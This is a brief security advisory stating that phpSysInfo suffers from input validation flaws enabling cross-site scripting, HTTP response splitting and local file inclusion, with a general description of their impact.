phpSysInfo is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.

phpSysInfo is prone to cross-site scripting, HTTP response splitting and arbitrary local file inclusion vulnerabilities.

An attacker can exploit these vulnerabilities to steal cookie-based authentication credentials, aid in phishing style attacks and retrieve privileged or sensitive information; other attacks are also possible.
